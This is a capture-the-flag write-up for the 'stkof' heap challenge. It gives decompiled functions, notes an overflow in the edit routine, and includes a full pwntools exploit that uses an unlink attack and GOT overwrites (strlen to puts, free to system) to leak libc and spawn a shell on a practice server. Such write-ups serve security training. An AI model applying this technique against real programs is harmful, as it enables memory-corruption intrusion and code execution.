# BUU-hitcontraining-stkof

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**add**

```c
__int64 sub_400936()
{
  __int64 size; // [rsp+0h] [rbp-80h]
  char *v2; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  size = atoll(s);
  v2 = (char *)malloc(size);
  if ( !v2 )
    return 0xFFFFFFFFLL;
  (&::s)[++chunk_count] = v2;
  printf("%d\n", (unsigned int)chunk_count);
  return 0LL;
}
```

**edit**

```c
__int64 sub_4009E8()
{
  __int64 result; // rax
  int i; // eax
  unsigned int index; // [rsp+8h] [rbp-88h]
  __int64 size; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  index = atol(s);
  if ( index > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[index] )
    return 0xFFFFFFFFLL;
  fgets(s, 16, stdin);
  size = atoll(s);
  ptr = (&::s)[index];
  for ( i = fread(ptr, 1uLL, size, stdin); i > 0; i = fread(ptr, 1uLL, size, stdin) )
  {
    ptr += i;
    size -= i;
  }
  if ( size )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
```

**free**

```c
__int64 sub_400B07()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  v1 = atol(s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[v1] )
    return 0xFFFFFFFFLL;
  free((&::s)[v1]);
  (&::s)[v1] = 0LL;
  return 0LL;
}
```

**show**

```c
__int64 sub_400BA9()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(s, 16, stdin);
  v1 = atol(s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[v1] )
    return 0xFFFFFFFFLL;
  if ( strlen((&::s)[v1]) <= 3 )
    puts("//TODO");
  else
    puts("...");
  return 0LL;
}
```

`free`时销毁了指针，没有UAF利用。但是可以申请任意大小的内存，在`edit`中有溢出。

同时，注意到堆指针都保存在`.bss`段上的`s`中。可以使用`unlink`，对指针进行覆写。

注意在`show`中，使用了`strlen`但是并没有真正输出内容。通过覆写`strlen`的got表为`puts`的plt表。再修改另一个堆块的指针为某`got`表，可以leak libc地址。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./stkof'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',28140)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')


def add(size):
    sh.sendline('1')
    sh.sendline(str(size))
    
def edit(index,size,content):
    sh.sendline('2')
    sh.sendline(str(index))
    sh.sendline(str(size))
    sh.sendline(str(content))
    
def free(index):
    sh.sendline('3')
    sh.sendline(str(index))
    
heap_array = 0x602150
strlen_got = elf.got['strlen']
puts_plt = elf.plt['puts']
free_got=elf.got['free']

add(0x10)
add(0x80) #2
sh.recvuntil('OK')
add(0x80) #3
sh.recvuntil('OK')
add(0x10)  #4
sh.recvuntil('OK')

edit(4,0x8,'/bin/sh\x00')

payload = p64(0)+p64(0x81)+p64(heap_array-0x18)+p64(heap_array-0x10)
payload=payload.ljust(0x80,'\x00')
payload+=p64(0x80)+p64(0x90)
edit(2,0x90,payload)
sh.recvuntil('OK')
#gdb.attach(sh)
free(3)
sh.recvuntil('OK')

payload=p64(0)+p64(strlen_got)+p64(free_got)
edit(2,0x18,payload)
sh.recvuntil('OK')

payload=p64(puts_plt)
edit(0,0x8,payload)
sh.recvuntil('OK')

sh.sendline('4')
sh.sendline('1')

free_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = LibcSearcher('free',free_addr)
libcbase = free_addr-libc.dump('free')
leak('libc base',libcbase)
system = libcbase+libc.dump('system')

edit(1,0x8,p64(system))
free(4)

sh.interactive()
```

